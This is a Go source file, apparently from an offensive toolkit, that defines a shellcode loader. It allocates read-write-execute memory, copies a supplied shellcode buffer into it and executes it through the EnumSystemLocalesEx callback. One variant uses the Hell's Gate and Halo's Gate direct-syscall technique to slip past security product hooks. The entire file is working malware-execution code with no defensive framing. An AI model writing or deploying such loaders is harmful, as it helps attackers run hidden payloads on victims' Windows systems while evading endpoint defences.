package loader

import (
	"unsafe"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func EnumSystemLocales(shellcode []byte) error {
	addr, _, err := wdll.VirtualAlloc().Call(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)

	if addr == 0 {
		return err
	}

	wdll.RtlMoveMemory().Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	wdll.EnumSystemLocalesEx().Call(
		addr,
		0,
		0,
		0,
	)

	return nil
}

/*

Hell's Gate + Halo's Gate technique

*/

func EnumSystemLocalesHalos(shellcode []byte) error {
	pHandle, _, _ := wdll.GetCurrentProcess().Call()

	var addr uintptr
	regionsize := uintptr(len(shellcode))

	r1, _, err := wdll.NtAllocateVirtualMemory().Call(
		pHandle,
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)

	if r1 != 0 {
		return err
	}

	wdll.NtWriteVirtualMemory().Call(
		pHandle,
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)

	wdll.EnumSystemLocalesEx().Call(
		addr,
		0,
		0,
		0,
	)

	return nil
}
